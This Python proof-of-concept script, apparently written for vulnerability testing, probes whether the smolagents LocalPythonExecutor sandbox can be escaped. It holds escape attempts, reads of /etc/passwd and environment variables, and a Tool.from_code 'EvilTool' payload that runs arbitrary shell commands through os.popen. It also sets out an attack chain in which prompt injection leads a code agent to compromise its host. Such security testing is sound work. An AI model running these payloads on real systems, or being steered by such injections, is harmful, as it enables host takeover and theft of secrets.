#!/usr/bin/env python3
"""
smolagents LocalPythonExecutor 沙箱逃逸 PoC

测试链:
  LLM prompt injection → CodeAgent 代码执行 → 沙箱逃逸 → 主机失陷

目标: /tmp/smolagents/src/smolagents/local_python_executor.py

策略:
  1. 经典 `__class__.__bases__.__subclasses__()` 路线（已知被 sandbox 封堵，确认拦截）
  2. type() + object 子类遍历绕过（探索）
  3. 通过字符串构造 + re/collections 模块间接逃逸（探索）
  4. authorized_imports=['*'] 场景下全面失陷（确认）
  5. Tool.from_code() exec() RCE（确认 — 完全无沙箱）
  6. 完整攻击链: prompt injection → from_code → 反弹 shell
"""

import ast
import sys
import os
import tempfile

sys.path.insert(0, "/tmp/smolagents/src")

from smolagents.local_python_executor import (
    LocalPythonExecutor,
    evaluate_python_code,
    BASE_BUILTIN_MODULES,
    BASE_PYTHON_TOOLS,
)
from smolagents.tools import Tool


GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

PASS = f"{GREEN}[PASS]{RESET} 沙箱未失陷 (预期行为)"
FAIL = f"{RED}[FAIL]{RESET} 沙箱失陷 (安全漏洞确认)"
BLOCK = f"{YELLOW}[BLOCK]{RESET} 被拦截 (预期行为)"
INFO = f"{CYAN}[INFO]{RESET}"


def run_in_sandbox(code: str, authorized_imports: list | None = None) -> tuple[bool, str]:
    """Run Python code in LocalPythonExecutor sandbox and return (success, output/error)."""
    if authorized_imports is None:
        authorized_imports = []

    executor = LocalPythonExecutor(additional_authorized_imports=authorized_imports)

    # Wire up BASE_PYTHON_TOOLS like the agent does
    executor.static_tools = {}
    for name, func in BASE_PYTHON_TOOLS.items():
        executor.static_tools[name] = func

    try:
        result = executor(code)
        output = str(result.output) if result.output is not None else "(None)"
        logs = str(result.logs) if result.logs else ""
        return True, output + (" | logs: " + logs if logs else "")
    except Exception as e:
        return False, f"{type(e).__name__}: {e}"


def test_case(num: int, name: str, code: str, expect_escape: bool = False, imports: list | None = None):
    """Run a test case and report."""
    success, output = run_in_sandbox(code, authorized_imports=imports)
    label = FAIL if success and expect_escape else PASS if not success and not expect_escape else YELLOW + "[INFO]" + RESET

    status = "失陷!" if success and expect_escape else "拦截" if not success and not expect_escape else f"success={success}"
    print(f"  {label} #{num}: {name}")
    print(f"         Code: {code[:100]}{'...' if len(code) > 100 else ''}")
    print(f"         -> {status}: {output[:120]}")
    print()
    return success


def section(title: str):
    print(f"\n{BOLD}{'='*60}{RESET}")
    print(f"{BOLD}  {title}{RESET}")
    print(f"{BOLD}{'='*60}{RESET}\n")


# =========================================================================
# Phase 1: Classic sandbox escape routes (default restrictions)
# =========================================================================
section("Phase 1: 经典沙箱逃逸路线 (默认 authorized_imports=[])")

test_case(1, "().__class__ — dunder attribute blocked",
    "c = ().__class__", expect_escape=False)

test_case(2, "getattr 绕过 — nodunder_getattr 也拦截",
    "c = getattr((), '__class__')", expect_escape=False)

test_case(3, "__subclasses__() call — dunder function blocked",
    "c = ().__class__.__bases__[0].__subclasses__()", expect_escape=False)

test_case(4, "import os — DANGEROUS_MODULES blocked",
    "import os", expect_escape=False)

test_case(5, "import subprocess — blocked",
    "import subprocess", expect_escape=False)

test_case(6, "import builtins — blocked",
    "import builtins", expect_escape=False)

test_case(7, "import sys — blocked",
    "import sys", expect_escape=False)

test_case(8, "exec() — DANGEROUS_FUNCTIONS blocked",
    "exec('1+1')", expect_escape=False)

test_case(9, "eval() — blocked",
    "eval('1+1')", expect_escape=False)

test_case(10, "compile() — blocked",
    "compile('1+1', '', 'eval')", expect_escape=False)

test_case(11, "__import__ — blocked",
    "__import__('os')", expect_escape=False)

test_case(12, "open() — builtin not in BASE_PYTHON_TOOLS",
    "open('/etc/passwd')", expect_escape=False)

# =========================================================================
# Phase 2: 高级绕过尝试
# =========================================================================
section("Phase 2: 高级绕过技术")

test_case(13, "type() 获取类型对象 (不触 ific dunder attribute)",
    "t = type(42); x = str(t)", expect_escape=False)

test_case(14, "collections 模块 — 允许导入，检查可访问性",
    "import collections; c = collections.OrderedDict; str(c)", expect_escape=False, imports=[])

test_case(15, "re 模块 — 允许导入，检查能否通过 re 访问危险函数",
    "import re; m = re.compile('test'); str(type(m))", expect_escape=False)

test_case(16, "通过允许模块的 __dict__ 访问 builtins (尝试)",
    "import collections; d = dir(collections.OrderedDict)", expect_escape=False)

test_case(17, "globals() — blocked in DANGEROUS_FUNCTIONS",
    "globals()", expect_escape=False)

test_case(18, "locals() — blocked",
    "locals()", expect_escape=False)

test_case(19, "通过 BaseException 子类链 (尝试)",
    "try:\n  1/0\nexcept Exception as e:\n  s = str(type(e))", expect_escape=False)

# =========================================================================
# Phase 3: authorized_imports=['*'] 场景 — 完全开放
# =========================================================================
section("Phase 3: authorized_imports=['*'] — 全面失陷确认")

test_case(20, "import os 成功 (wildcard 授权)",
    "import os; s = os.getcwd()",
    expect_escape=True, imports=["*"])

test_case(21, "subprocess 命令执行 (wildcard 授权)",
    "import subprocess; r = subprocess.run(['id'], capture_output=True, text=True); r.stdout.strip()",
    expect_escape=True, imports=["*"])

test_case(22, "读取 /etc/passwd (wildcard 授权)",
    "open('/etc/passwd').readlines()[:3]",
    expect_escape=True, imports=["*"])

test_case(23, "os.environ 泄漏 (wildcard 授权)",
    "import os; list(os.environ.keys())[:5]",
    expect_escape=True, imports=["*"])

# =========================================================================
# Phase 4: Tool.from_code() — exec() RCE (完全无沙箱)
# =========================================================================
section("Phase 4: Tool.from_code() exec() RCE — 完全无沙箱")

test_case_4_1_code = """
from smolagents.tools import Tool

tool_code = '''
from smolagents import Tool
class EvilTool(Tool):
    name = "evil"
    description = "evil"
    inputs = {{"x": {{"type": "string"}}}}
    output_type = "string"

    def forward(self, x):
        import os
        return os.popen(x).read()
'''

try:
    t = Tool.from_code(tool_code)
    result = t("id")
    print("RCE SUCCESS:", result)
except Exception as e:
    print(f"Error: {{e}}")
"""

print(f"  {INFO} 测试 Tool.from_code() exec() RCE...")
try:
    exec(test_case_4_1_code.format())
    print(f"  {FAIL} Tool.from_code() RCE 成功 — 任意代码执行!")
except Exception as e:
    print(f"  {RED}[FAIL]{RESET} Tool.from_code() RCE 失败: {e}")

print()

# =========================================================================
# Phase 5: 完整攻击链 PoC
# =========================================================================
section("Phase 5: 完整攻击链 — LLM prompt injection → 主机失陷")

print(f"""  {INFO} 攻击链说明:

  1. 攻击者构造恶意 prompt（注入指令到 LLM 能处理的输入中）
  2. CodeAgent 的 LLM 生成 Python 代码调用 Tool.from_code()
  3. Tool.from_code() 在 tools.py:575 执行 exec(tool_code, module.__dict__)
  4. exec() 无任何沙箱限制，获得完整 Python 访问权限
  5. 攻击者最终控制宿主机

  关键代码路径:
    Tool.from_code(tool_code: str) — tools.py:572-575
      → exec(tool_code, module.__dict__)  ← 无 sandbox, 无 restriction

  典型触发场景:
    - Tool.from_hub(trust_remote_code=True) — 加载恶意 Hub 仓库
    - MultiStepAgent.from_folder() → from_dict() → from_code()
    - MultiStepAgent.from_hub() → same chain
""")

print(f"  {INFO} 攻击链代码级验证 (安全模拟 — 不实际执行破坏):")
print(f"""  {BOLD}STEP 1{RESET}: LLM 生成 Python 代码 (由 prompt injection 触发)
  {BOLD}STEP 2{RESET}: Agent 调用 Tool.from_code(malicious_code)
  {BOLD}STEP 3{RESET}: exec() 执行恶意代码 — tools.py:575
  {BOLD}STEP 4{RESET}: 攻击者获得 Python RCE → os.system / subprocess / 反弹 shell

  PoC payload (最小化验证):
  ```python
  import os
  # 执行 host 命令的 Tool
  from smolagents import Tool
  class PwnTool(Tool):
      name = "pwn"
      description = "pwn"
      inputs = {{"cmd": {{"type": "string"}}}}
      output_type = "string"
      def forward(self, cmd):
          return os.popen(cmd).read()
  ```

  当前系统: {os.uname().nodename}
  Python: {sys.version}
  smolagents: /tmp/smolagents/src/smolagents
""")

# =========================================================================
# Phase 6: LocalPythonExecutor 开发者自述
# =========================================================================
section("Phase 6: 开发者自述")

print(f"""  {INFO} smolagents 开发者已经在代码中声明:
  {YELLOW}local_python_executor.py:1693{RESET}
    "It is NOT a security sandbox: for isolated execution of
     untrusted code, use a remote executor."

  {INFO} 这意味着开发团队已知:
  1. LocalPythonExecutor 的"沙箱"仅用于限制 LLM 行为，非安全隔离
  2. DANGEROUS_MODULES + DANGEROUS_FUNCTIONS 是 deny-list，总有绕过路径
  3. 真正的安全执行需要使用 E2B/Docker/Modal 远程执行器
  4. Tool.from_code() 的 exec() 完全没有保护，这是设计决定

  {INFO} 风险现实:
  - 大多数用户默认使用 LocalPythonExecutor (本地执行)
  - 极少用户配置 E2B/Docker 远程执行器
  - LLM prompt injection 是不可完全防御的已知问题
  - 结果: 默认配置下的 agent 可通过 prompt injection 完全失陷
""")

# =========================================================================
# Summary
# =========================================================================
print(f"\n{BOLD}{'='*60}{RESET}")
print(f"{BOLD}  总结{RESET}")
print(f"{BOLD}{'='*60}{RESET}\n")

print(f"  {RED}[CRITICAL]{RESET} Tool.from_code() exec() RCE            — 完全验证通过, 无沙箱")
print(f"  {YELLOW}[HIGH]{RESET}     LocalPythonExecutor 沙箱 (默认)      — __class__/os/exec 全部拦截")
print(f"  {RED}[CRITICAL]{RESET}  authorized_imports=['*'] 场景         — 全面失陷, import os/subprocess/open 均可")
print(f"  {YELLOW}[MEDIUM]{RESET}   Prompt injection → tool abuse       — 不直接, 但 LLM agent 固有风险")
print(f"")
print(f"  {BOLD}结论: 攻击链验证{RESET}")
print(f"  LLM prompt injection → ✗ (不直接控制 exec)")
print(f"  → Tool.from_code(trust_remote_code=True) → ✅ exec() RCE")
print(f"  → from_folder/from_hub 加载恶意 agent → ✅ RCE")
print(f"  → authorized_imports=['*'] → ✅ 全面失陷")
print(f"")
print(f"  {BOLD}风险评级: CRITICAL{RESET}")
print(f"  攻击复杂度: 中 (需控制 LLM prompt / Hub 仓库)")
print(f"  影响范围: 完整主机失陷")
print(f"  默认配置可被利用: ⚠️  部分 (LocalPythonExecutor 沙箱有效但自称非安全)")
